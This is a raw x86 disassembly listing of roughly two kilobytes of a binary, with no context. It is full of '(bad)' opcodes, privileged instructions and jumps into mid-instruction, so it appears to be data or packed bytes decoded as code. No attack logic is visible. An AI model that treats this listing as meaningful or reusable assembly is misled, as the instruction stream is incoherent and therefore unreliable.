  4322cf:	add    BYTE PTR [edi-0x48fef979],dh
  4322d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322dc:	inc    esp
  4322dd:	mov    ebx,DWORD PTR [eax]
  4322df:	fcom   st(2)
  4322e1:	add    BYTE PTR [edi],bl
  4322e3:	lea    ecx,[eax-0x18]
  4322e6:	(bad)  
  4322e7:	push   DWORD PTR [ecx]
  4322e9:	call   0xffb5704b
  4322ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322f2:	fstp   DWORD PTR [esi+ebx*8]
  4322f5:	push   ebp
  4322f6:	pop    ebp
  4322f7:	mov    esi,DWORD PTR [edx-0x38]
  4322fa:	add    DWORD PTR [eax],0x28
  4322fd:	mov    edi,DWORD PTR [ebx]
  4322ff:	xor    esi,DWORD PTR [edx+0x3]
  432302:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432306:	pop    ebp
  432307:	or     al,0x4
  432309:	inc    ecx
  43230a:	push   ebp
  43230b:	(bad)  
  43230c:	in     al,dx
  43230d:	or     ah,ch
  43230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432310:	xbegin 0xffc89906
  432316:	clc    
  432317:	adc    al,0x45
  432319:	div    BYTE PTR [edx]
  43231b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432322:	test   DWORD PTR [ebx+0x666300f8],ebx
  432328:	add    BYTE PTR [ecx+0x66],dh
  43232b:	add    eax,DWORD PTR [ebp+0x52]
  43232e:	adc    eax,0xffffffa0
  432331:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432337:	test   DWORD PTR [eax],eax
  432339:	clc    
  43233a:	data16 or al,BYTE PTR [ebp+0x45]
  43233e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432345:	rol    BYTE PTR [ebp+0x45],1
  432348:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43234e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432354:	push   ebx
  432355:	add    BYTE PTR [eax+eax*1+0x51],dl
  432359:	jge    0x43238e
  43235b:	add    BYTE PTR [esi+0x4],dl
  43235e:	jne    0x4323c5
  432360:	mov    edx,0x457200
  432365:	jmp    0x432329
  432367:	xor    edi,DWORD PTR [ebx]
  432369:	pop    edi
  43236a:	cvtdq2ps xmm7,xmm0
  43236d:	ret    0x0
  432370:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432376:	xor    ecx,DWORD PTR [edi]
  432378:	add    eax,DWORD PTR [ecx+0x3b]
  43237b:	push   ebx
  43237c:	rdpmc  
  43237e:	out    0x8d,al
  432380:	add    BYTE PTR [eax],cl
  432382:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432388:	ret    0x450c
  43238b:	sbb    al,0x8b
  43238d:	cmp    eax,esi
  43238f:	or     cl,al
  432391:	or     al,0xc2
  432393:	pop    eax
  432394:	inc    ebp
  432395:	add    ecx,DWORD PTR [edi]
  432397:	add    esi,DWORD PTR [ebp+0x39]
  43239a:	invd   
  43239c:	jge    0x4323a8
  43239e:	mov    eax,0x478ac0
  4323a3:	cli    
  4323a4:	xor    esp,ecx
  4323a6:	mov    ebx,0x5b8ac0
  4323ab:	ret    0x33
  4323ae:	mov    eax,0x833b8b
  4323b3:	sub    BYTE PTR [ebx],al
  4323b5:	inc    ebp
  4323b6:	xor    ax,di
  4323b9:	pushf  
  4323ba:	inc    bh
  4323bc:	mov    esp,esp
  4323be:	hlt    
  4323bf:	test   DWORD PTR [ebp-0x8],esi
  4323c2:	mov    eax,DWORD PTR [ebp-0x14]
  4323c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323cb:	dec    edi
  4323cc:	or     BYTE PTR [eax],al
  4323ce:	jne    0x432359
  4323d0:	mov    esi,esp
  4323d2:	call   0x77a9af97
  4323d7:	inc    ebp
  4323d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323e4:	add    BYTE PTR [esi+0x7d],ah
  4323e7:	inc    ebp
  4323e8:	mov    bx,WORD PTR [ebp+0x8]
  4323ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4323f3:	inc    ebp
  4323f4:	mov    bx,di
  4323f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4323fe:	jge    0x4323c1
  432400:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432406:	cli    
  432407:	xor    bl,bh
  432409:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43240f:	test   BYTE PTR [eax],cl
  432411:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432418:	cmp    ebp,eax
  43241a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432421:	test   BYTE PTR [ebp+0x1],bh
  432424:	mov    ebx,0x458a00
  432429:	xor    esi,DWORD PTR [ebx]
  43242b:	add    esp,DWORD PTR [esi-0x77]
  43242e:	pop    ebp
  43242f:	loopne 0x432497
  432431:	inc    ebp
  432432:	clc    
  432433:	xor    edi,DWORD PTR [ebx]
  432435:	add    esi,DWORD PTR [edx-0x77]
  432438:	data16 fdivr QWORD PTR [ebp-0x49]
  43243c:	mov    ebx,0xb78afc
  432441:	hlt    
  432442:	xor    edi,DWORD PTR [esi+eiz*2]
  432445:	add    BYTE PTR [ebp+0x66],bl
  432448:	data16 lock clc 
  43244b:	cmp    al,0x3b
  43244d:	add    BYTE PTR [edi+0x66],dh
  432450:	psubq  mm7,QWORD PTR [ebp+0x2]
  432454:	ltr    WORD PTR [ebp+0x66]
  432458:	add    esi,eax
  43245a:	add    di,WORD PTR [ebp+0x2b]
  43245e:	data16 data16 jge 0x4324df
  432462:	mov    ebx,0xe08a8b
  432467:	jge    0x43249c
  432469:	data16 data16 xor al,0x5d
  43246d:	data16 data16 jne 0x432469
  432471:	mov    edi,DWORD PTR [ebx]
  432473:	fdiv   QWORD PTR [edx+0x7d]
  432476:	data16 data16 jge 0x4324ae
  43247a:	mov    ebx,0x758a66
  43247f:	mov    esi,0x667233
  432484:	pop    ebp
  432485:	or     BYTE PTR [esi+0x0],ah
  432488:	clc    
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	lock ja 0x432419
  43248e:	(bad)  
  432490:	jge    0x432489
  432492:	invd   
  432494:	pop    ebp
  432495:	add    BYTE PTR [ebx],al
  432497:	(bad)  
  432498:	cmp    di,WORD PTR [ebp+0xf]
  43249c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324a0:	mov    bx,WORD PTR [ebp-0x10]
  4324a4:	pop    bp
  4324a6:	fbstp  TBYTE PTR [ebx]
  4324a8:	test   DWORD PTR [ebx],eax
  4324aa:	add    BYTE PTR [ebx],bh
  4324ac:	add    BYTE PTR [esi+0x7d],ah
  4324af:	jge    0x43243c
  4324b1:	data16 in al,dx
  4324b3:	pop    ebp
  4324b4:	stc    
  4324b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324bc:	mov    edi,ebx
  4324be:	in     al,dx
  4324bf:	test   BYTE PTR [ebp+0x0],bh
  4324c2:	mov    eax,DWORD PTR [eax]
  4324c4:	call   0xbd401e54
  4324c9:	cmp    al,0x9b
  4324cb:	add    BYTE PTR [edx],dh
  4324cd:	mov    bx,di
  4324d0:	call   0x8b4ba260
  4324d5:	add    ebp,esp
  4324d7:	mov    bx,di
  4324da:	jnp    0x432502
  4324dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324e2:	mov    eax,DWORD PTR [eax]
  4324e4:	call   0x7c3eb04f
  4324e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4324fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432504:	(bad)  
  432505:	cld    
  432506:	jne    0x432544
  432508:	xor    eax,DWORD PTR [eax]
  43250a:	mov    esp,DWORD PTR [esi-0x10]
  43250d:	sti    
  43250e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432515:	data16 adc bl,bh
  432518:	push   ebp
  432519:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432520:	mov    WORD PTR [eax],es
  432522:	fwait
  432523:	data16 xor bh,bl
  432526:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43252c:	mov    esp,DWORD PTR [esi-0x14]
  43252f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432535:	or     al,0x2b
  432537:	mov    bh,0xba
  432539:	hlt    
  43253a:	mov    bh,bl
  43253c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432542:	dec    esi
  432543:	or     al,0x0
  432545:	mov    edi,DWORD PTR [ebx]
  432547:	or     BYTE PTR [ebp+0x3b],dh
  43254a:	mov    ecx,DWORD PTR [edi]
  43254c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432552:	xor    al,0xd8
  432554:	pop    bp
  432556:	lock xor esi,DWORD PTR [ebx]
  432559:	lea    esp,[esi+0x1f]
  43255c:	icebp  
  43255d:	jb     0x432563
  43255f:	add    al,al
  432561:	jge    0x43256f
  432563:	mov    eax,eax
  432565:	fsubr  st,st(3)
  432567:	pop    ebp
  432568:	mov    esi,DWORD PTR [ebx]
  43256a:	in     al,0x8d
  43256c:	rcr    DWORD PTR [edi],0xc2
  43256f:	jb     0x4325cf
  432571:	add    cl,cl
  432573:	jge    0x432581
  432575:	mov    edx,DWORD PTR [ebp-0x20]
  432578:	in     al,dx
  432579:	pop    ebp
  43257a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43257f:	cmp    di,WORD PTR [ebp+0x0]
  432583:	mov    ebp,DWORD PTR [ebx]
  432585:	fdivr  QWORD PTR [esi+0x668a5d]
  43258b:	cmp    al,0x33
  43258d:	mov    si,0x4e7d
  432591:	mov    eax,DWORD PTR [eax]
  432593:	lock inc ebp
  432595:	mov    esi,DWORD PTR [eax]
  432597:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43259e:	clc    
  43259f:	(bad)  
  4325a0:	cmp    edi,DWORD PTR [ebx]
  4325a2:	je     0x4325b3
  4325a4:	push   ebx
  4325a5:	loopne 0x4325b6
  4325a7:	dec    ecx
  4325a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4325ac:	int    0xf1
  4325ae:	mov    esi,0x703084d
  4325b3:	pcmpgtd mm6,mm1
  4325b6:	add    BYTE PTR [ebp+0x66],dh
  4325b9:	jmp    0x432586
  4325bb:	mov    eax,DWORD PTR [ebx]
  4325bd:	lock push ebp
  4325bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325c5:	or     bh,dl
  4325c7:	jb     0x4325c7
  4325c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325cf:	loopne 0x4325d1
  4325d1:	jne    0x4325d5
  4325d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4325d7:	mov    ecx,ebx
  4325d9:	data16 cmp al,0xf1
  4325dc:	add    BYTE PTR [esi+eiz*2],bh
  4325df:	add    bl,cl
  4325e1:	retw   0xf2
  4325e5:	ret    0x66
  4325e8:	retf   
  4325e9:	enterw 0x4df1,0x19
  4325ee:	pop    edi
  4325ef:	jne    0x432572
  4325f1:	mov    esi,DWORD PTR [eax]
  4325f3:	call   0x77b7b194
  4325f8:	xor    ebp,DWORD PTR [ebx]
  4325fa:	lea    esp,[esi+0x48]
  4325fd:	repnz in eax,0x3b
  432600:	add    BYTE PTR [ebp-0x37],dh
  432603:	xor    edx,DWORD PTR [ebp-0x15]
  432606:	in     al,dx
  432607:	xor    edx,DWORD PTR [esi+0x40]
  43260a:	mov    DWORD PTR [edi],0x338545fc
  432610:	clc    
  432611:	add    esi,DWORD PTR [ecx]
  432613:	pop    edi
  432614:	pushf  
  432615:	pop    ebx
  432616:	call   0xff4425dd
  43261b:	mov    edi,eax
  43261d:	push   ecx
  43261e:	pop    es
  43261f:	mov    edi,DWORD PTR [eax]
  432621:	push   esi
  432622:	inc    esi
  432623:	add    bh,BYTE PTR [esi+0x0]
  432626:	popa   
  432627:	data16 (bad) 
  432629:	into   
  43262a:	gs cmp al,0xcd
  43262d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432633:	ret    0x66
  432636:	add    bh,al
  432638:	add    bh,ah
  43263a:	add    BYTE PTR [ebp+0x31c3f866],al
  432640:	cmp    al,0x9c
  432642:	add    BYTE PTR [esi+0x66],ah
  432645:	into   
  432646:	ret    
  432647:	pop    ebp
  432648:	adc    BYTE PTR [edi+0x0],dl
  43264b:	mov    bh,0x66
  43264d:	mov    edi,0xff038dc3
  432652:	jne    0x4326a8
  432654:	lea    edx,[ecx+0x1]
  432657:	mov    ebx,0xd64ff1
  43265c:	sar    DWORD PTR [ebx],1
  43265e:	test   BYTE PTR [ebp+0x36],dh
  432661:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432665:	push   edi
  432666:	xor    BYTE PTR [ebx],0x38
  432669:	mov    esi,ebx
  43266b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432671:	ss inc ebp
  432673:	fs pop ebx
  432675:	mov    ebx,0x9c3b30
  43267a:	je     0x4326a7
  43267c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432682:	mov    WORD PTR [ebx],?
  432684:	ss mov ebx,0x8b4e64
  43268a:	pop    edi
  43268b:	cmp    ecx,ecx
  43268d:	jne    0x4326e4
  43268f:	mov    ebp,esp
  432691:	cld    
  432692:	push   esi
  432693:	pop    ebx
  432694:	inc    ebp
  432695:	stc    
  432696:	xor    BYTE PTR [ebp+0x9bef89c],al
  43269c:	test   esi,ecx
  43269e:	clc    
  43269f:	test   dl,dl
  4326a1:	cmp    bh,bh
  4326a3:	fs pop si
  4326a6:	or     bl,al
  4326a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4326ae:	retf   0x3c45
  4326b1:	xor    BYTE PTR [eax],al
  4326b3:	pushf  
  4326b4:	mov    si,0x85ca
  4326b8:	ret    0xf8
  4326bb:	pop    ebx
  4326bc:	dec    dx
  4326bf:	mov    edx,DWORD PTR [edi-0x76]
  4326c2:	push   edi
  4326c3:	add    al,0xb7
  4326c5:	xor    al,0xba
  4326c7:	cmp    al,0x8d
  4326c9:	je     0x4326ca
  4326cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326cf:	lea    edi,[ebx+0x544fff]
  4326d5:	push   ecx
  4326d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4326d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326df:	add    BYTE PTR [ebx],dh
  4326e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4326ee:	mov    ebx,0x3b3b00
  4326f3:	jne    0x432720
  4326f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4326fb:	xor    esi,DWORD PTR [ebx]
  4326fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432703:	push   edi
  432704:	cmp    esp,ebp
  432706:	jne    0x432708
  432708:	sbb    DWORD PTR [eax],0x8085c3fc
  43270e:	clc    
  43270f:	inc    esi
  432710:	pop    ebx
  432711:	sti    
  432712:	add    eax,0xeb8bc075
  432717:	cld    
  432718:	xor    edi,DWORD PTR ds:0xf8c3855e
  43271e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432721:	rol    DWORD PTR [ebp-0x37],0xf
  432725:	mov    DWORD PTR [eax],ecx
  432727:	inc    edi
  432728:	(bad)  
  432729:	in     eax,0xfe
  43272b:	add    bh,bh
  43272d:	(bad)  
  43272e:	mov    esi,0xc38a5e
  432733:	mov    esi,DWORD PTR [ebx]
  432735:	push   ecx
  432736:	mov    edi,0xfc4ec7
  43273b:	test   DWORD PTR [ebp-0x8],edx
  43273e:	xor    di,ax
  432741:	pushf  
  432742:	sub    ebp,eax
  432744:	inc    ebp
  432745:	(bad)  
  432746:	sub    edi,edi
  432748:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43274e:	inc    ebp
  43274f:	add    BYTE PTR [esi+0x2b],ah
  432752:	or     bh,BYTE PTR [edx+0xf8ac2]
  432758:	cmp    al,0x33
  43275a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432760:	(bad)  
  432761:	cmp    esi,DWORD PTR [ebx]
  432763:	je     0x43271d
  432765:	push   ebx
  432766:	dec    esi
  432767:	str    ecx
  43276a:	cmp    esp,DWORD PTR [ebp+0x75]
  43276d:	int    0x33
  43276f:	mov    edi,0x789085f
  432774:	mov    edx,DWORD PTR [eax]
  432776:	cld    
  432777:	add    cl,cl
  432779:	data16 add al,0xcb
  43277c:	push   ebp
  43277d:	add    ebp,esp
  43277f:	jne    0x43276d
  432781:	(bad)  
  432782:	mov    DWORD PTR [ecx],0xd685f7ec
  432788:	clc    
  432789:	xlat   BYTE PTR ds:[ebx]
  43278a:	inc    ebp
  43278b:	mov    esi,DWORD PTR [edx]
  43278d:	push   eax
  43278e:	pushf  
  43278f:	in     eax,0x8b
  432791:	add    ah,ch
  432793:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432797:	add    ax,0x72cb
  43279b:	cmp    al,0x0
  43279d:	add    BYTE PTR [ebp+0x66],al
  4327a0:	(bad)  
  4327a1:	retf   
  4327a2:	lock ret 0x85
  4327a6:	clc    
  4327a7:	inc    bp
  4327a9:	retf   
  4327aa:	cmp    eax,0xc77d9cc8
  4327af:	xor    ah,bh
  4327b1:	pushf  
  4327b2:	test   DWORD PTR [edi-0x8],ebx
  4327b5:	je     0x4327fc
  4327b7:	xor    esi,DWORD PTR ds:0x7020840
  4327bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4327c1:	push   ebp
  4327c2:	add    esp,ebp
  4327c4:	jb     0x432751
  4327c6:	add    BYTE PTR [eax],cl
  4327c8:	dec    ebp
  4327c9:	mov    bh,0x81
  4327cb:	push   esi
  4327cc:	push   esp
  4327cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327d4:	xor    al,BYTE PTR [eax]
  4327d6:	mov    edx,DWORD PTR [edi+0x10]
  4327d9:	(bad)  
  4327da:	scas   eax,DWORD PTR es:[edi]
  4327db:	ret    0x3b
  4327de:	jns    0x3b4424d1
  4327e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327e8:	dec    ebp
  4327e9:	or     BYTE PTR [ebx],ch
  4327eb:	ret    0x458b
  4327ee:	lock jmp 0x4327e2
  4327f1:	mov    ecx,DWORD PTR [eax]
  4327f3:	or     BYTE PTR [edi],al
  4327f5:	mov    ecx,eax
  4327f7:	xor    DWORD PTR [edx+0x2],0x0
  4327fb:	mov    bh,0xc1
  4327fd:	adc    BYTE PTR [eax],dh
  4327ff:	iret   
  432800:	inc    ebp
  432801:	mov    DWORD PTR [ebx],0x4dfff8c4
  432807:	inc    BYTE PTR [ebx]
  432809:	ret    0xf8
  43280c:	adc    DWORD PTR [esi+0x10],esp
  43280f:	clc    
  432810:	dec    ecx
  432811:	fisttp WORD PTR [ecx+0x456604c0]
  432817:	add    dh,BYTE PTR ds:0x75e0845
  43281d:	ret    0x4d
  432820:	lea    ecx,[ebx+0x18728301]
  432826:	add    BYTE PTR [ebp+0x45],al
  432829:	xor    ecx,ebp
  43282b:	pushf  
  43282c:	add    bh,al
  43282e:	add    al,ch
  432830:	inc    ebp
  432831:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432837:	xor    eax,0x781084d
  43283c:	push   esp
  43283d:	fwait
  43283e:	push   ecx
  43283f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432845:	inc    ebp
  432846:	cmp    edi,DWORD PTR [ecx]
  432848:	jbe    0x4327e6
  43284a:	mov    eax,edi
  43284c:	or     ah,dh
  43284e:	inc    ebp
  43284f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432855:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43285b:	in     al,dx
  43285c:	hlt    
  43285d:	push   esp
  43285e:	push   esp
  43285f:	push   ecx
  432860:	push   ecx
  432861:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432867:	fwait
  432868:	fwait
  432869:	xor    dh,BYTE PTR [edx]
  43286b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432871:	or     BYTE PTR [ebp+0x7],al
  432874:	mov    eax,ecx
  432876:	clc    
  432877:	jb     0x43283a
  432879:	add    BYTE PTR [ebp+0x55],cl
  43287c:	or     DWORD PTR [edi],0xc251d154
  432882:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43288c:	mov    edi,eax
  43288e:	or     cl,al
  432890:	inc    ebp
  432891:	dec    ebp
  432892:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432898:	or     WORD PTR [ecx],0x899b
  43289d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328a3:	mov    edx,DWORD PTR [ecx+0x8]
  4328a6:	mov    eax,DWORD PTR [ebp-0x8]
  4328a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328b6:	inc    ebp
  4328b7:	dec    eax
  4328b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328be:	add    edx,DWORD PTR [ecx-0x8]
  4328c1:	mov    ecx,DWORD PTR [ecx]
  4328c3:	clc    
  4328c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328cb:	mov    ecx,ebp
  4328cd:	clc    
  4328ce:	(bad)  
  4328cf:	popf   
  4328d0:	inc    DWORD PTR [eax]
  4328d2:	ret    0x8b
  4328d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328db:	mov    edi,esp
  4328dd:	hlt    
  4328de:	test   ecx,esi
  4328e0:	clc    
  4328e1:	or     BYTE PTR [ebp+0x7],al
  4328e4:	xor    al,cl
  4328e6:	pushf  
  4328e7:	jb     0x43291c
  4328e9:	add    BYTE PTR [eax-0x3f],al
  4328ec:	inc    eax
  4328ed:	daa    
  4328ee:	inc    ebp
  4328ef:	inc    ebp
  4328f0:	xor    eax,0x7f80803
  4328f5:	dec    ebp
  4328f6:	fwait
  4328f7:	add    esi,DWORD PTR [edx]
  4328f9:	clc    
  4328fa:	cmp    DWORD PTR [ecx],ecx
  4328fc:	or     al,0x8
  4328fe:	add    al,BYTE PTR [ebp+0x2c]
  432901:	xor    eax,0x7350845
  432906:	or     BYTE PTR [ebp+0x7],cl
  432909:	lea    ebx,[ebx-0x748dcdff]
  43290f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432916:	mov    edx,DWORD PTR [eax]
  432918:	cld    
  432919:	dec    ebp
  43291a:	push   esp
  43291b:	sub    edx,DWORD PTR [ecx-0x75]
  43291e:	add    eax,0xf172fc
  432923:	or     BYTE PTR [ebp+0x7],cl
  432926:	add    eax,ecx
  432928:	or     al,0x72
  43292a:	add    DWORD PTR [eax],eax
  43292c:	mov    ebx,0x29c2c1
  432931:	inc    ebp
  432932:	mov    eax,DWORD PTR [ebx]
  432934:	cmp    eax,0x3004d1c
  43293a:	xbegin 0x66c8b534
  432940:	clc    
  432941:	or     BYTE PTR [ebp+0x45],al
  432944:	xor    dh,BYTE PTR ds:0x78b089c
  43294a:	adc    BYTE PTR [ebp+0x45],cl
  43294d:	lea    eax,[ebp+0x33727501]
  432953:	add    cl,ch
  432955:	inc    ebp
  432956:	add    bl,ch
  432958:	add    BYTE PTR [ebx+0x45850845],cl
  43295e:	je     0x4328eb
  432960:	push   ebx
  432961:	or     al,0x85
  432963:	dec    ebp
  432964:	std    
  432965:	mov    bh,bh
  432967:	mov    BYTE PTR [ebp-0x75],al
  43296a:	mov    edi,eax
  43296c:	or     al,0x89
  43296e:	inc    ebp
  43296f:	clc    
  432970:	mov    esp,esp
  432972:	hlt    
  432973:	call   DWORD PTR [edi-0x37]
  432976:	push   esp
  432977:	or     al,0x51
  432979:	push   ebp
  43297a:	xor    ebp,esp
  43297c:	mov    esi,0x457251
  432981:	xor    esi,eax
  432983:	pushf  
  432984:	inc    ebp
  432985:	(bad)  
  432986:	mov    edi,eax
  432988:	or     al,0x85
  43298a:	add    al,bh
  43298c:	inc    eax
  43298e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432992:	or     ah,bh
  432994:	inc    eax
  432995:	push   esp
  432996:	jmp    0x4329e9
  432998:	mov    eax,DWORD PTR ds:0xe8720c
  43299e:	mov    DWORD PTR [ebp-0x8],eax
  4329a1:	jne    0x4329e8
  4329a3:	jmp    0x432930
  4329a5:	mov    ebp,DWORD PTR [eax]
  4329a7:	clc    
  4329a8:	retf   0xff54
  4329ab:	push   ecx
  4329ac:	mov    DWORD PTR ds:0x757210,eax
  4329b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4329b5:	sub    esp,DWORD PTR [ebx-0x77]
  4329b8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329bf:	or     ah,bh
  4329c1:	pop    es
  4329c2:	ds fwait
  4329c4:	push   DWORD PTR [edx]
  4329c6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329cc:	(bad)  
  4329cd:	mov    bh,bh
  4329cf:	jmp    0x4329bd
  4329d1:	leave  
  4329d2:	jne    0x4329dc
  4329d4:	call   0x30232e
  4329d9:	in     al,dx
  4329da:	dec    ebp
  4329db:	add    dh,BYTE PTR [ebx]
  4329dd:	add    BYTE PTR [ebx],al
  4329df:	inc    ebp
  4329e0:	cmp    esi,DWORD PTR [ecx]
  4329e2:	je     0x432980
  4329e4:	mov    eax,edi
  4329e6:	or     al,0xf0
  4329e8:	add    BYTE PTR [ebp+0x458bf845],al
  4329ee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329f4:	adc    al,0x7
  4329f6:	enter  0x9fc0,0xa5
  4329fa:	rol    BYTE PTR [eax],0x5e
  4329fd:	mov    ecx,ecx
  4329ff:	or     al,0xc
  432a01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a08:	jmp    0x432a09
  432a0a:	push   ebp
  432a0b:	mov    esp,ebp
  432a0d:	cld    
  432a0e:	inc    ebp
  432a0f:	inc    ebp
  432a10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a17:	push   esi
  432a18:	push   esi
  432a19:	mov    edi,0x7af080f
  432a1e:	add    bh,al
  432a20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a26:	add    BYTE PTR [ecx+0x4540100f],cl
  432a2c:	mov    ebp,eax
  432a2e:	mov    ebp,edi
  432a30:	lock call edx
  432a33:	fcom   DWORD PTR [ebp+0x45]
  432a36:	mov    eax,0x148a8b
  432a3b:	push   ecx
  432a3c:	enter  0xc145,0x83
  432a40:	cmp    ecx,DWORD PTR [eax]
  432a42:	add    BYTE PTR [ebp+0x4d],al
  432a45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a4b:	call   0xffa325ba
  432a50:	cmp    eax,DWORD PTR [ebp-0xc]
  432a53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a57:	push   ebp
  432a58:	(bad)  
  432a59:	call   0x34285d
  432a5e:	mov    bh,0xdb
  432a60:	cld    
  432a61:	or     BYTE PTR [ebp+0x45],bl
  432a64:	(bad)  
  432a65:	call   0xff7d26f5
  432a6a:	add    al,BYTE PTR [ebp+0x37]
  432a6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a73:	jne    0x432a75
  432a75:	(bad)  
  432a76:	cmp    edi,esp
  432a78:	jne    0x432aab
  432a7a:	mov    edi,edi
  432a7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a82:	pop    ds
  432a83:	into   
  432a84:	je     0x432a47
  432a86:	mov    ebx,DWORD PTR [esi]
  432a88:	or     BYTE PTR [ebp-0x49],al
  432a8b:	mov    esp,DWORD PTR [esi-0x77]
  432a8e:	mov    esi,0x2451f0c
  432a93:	mov    eax,DWORD PTR [eax]
  432a95:	or     al,0x66
  432a97:	sar    bl,0x3b
  432a9a:	xor    esi,DWORD PTR [ebp+0x66]
  432a9d:	xor    ecx,edi
  432a9f:	pop    edi
  432aa0:	adc    bl,BYTE PTR [ebx+0x7e]
  432aa3:	ret    0xff
  432aa6:	cld    
  432aa7:	inc    ebp
  432aa8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432aae:	cld    
  432aaf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432ab6:	push   0xffffff83
  432ab8:	pop    edi
  432ab9:	or     BYTE PTR [ebp+0x53],dh
  432abc:	xorps  xmm1,xmm2
  432abf:	test   BYTE PTR [eax+eax*1],bh
  432ac2:	add    BYTE PTR [eax],al
  432ac4:	adc    eax,eax
  432ac6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ace:	jmp    DWORD PTR [eax]
  432ad0:	ror    al,0x5e
  432ad3:	inc    ebp
  432ad4:	leave  
  432ad5:	xor    ecx,DWORD PTR [eax]
  432ad7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432add:	add    ah,al
  432adf:	xor    edi,edi
  432ae1:	xor    DWORD PTR [ebx],0x66003302
  432ae7:	mov    DWORD PTR [ebp-0xc],ecx
  432aea:	pcmpgtw mm0,mm0
  432aed:	add    dl,ah
  432aef:	leave  
  432af0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432af4:	push   eax
  432af5:	dec    ebp
  432af6:	mov    esi,DWORD PTR [ebx-0x75]
  432af9:	lea    ebp,[eax-0x7c00ff02]
  432aff:	xor    eax,DWORD PTR [eax]
  432b01:	sysret 
  432b03:	dec    ebp
  432b04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b0b:	push   WORD PTR [ecx+0x8]
  432b0f:	jne    0x432ad2
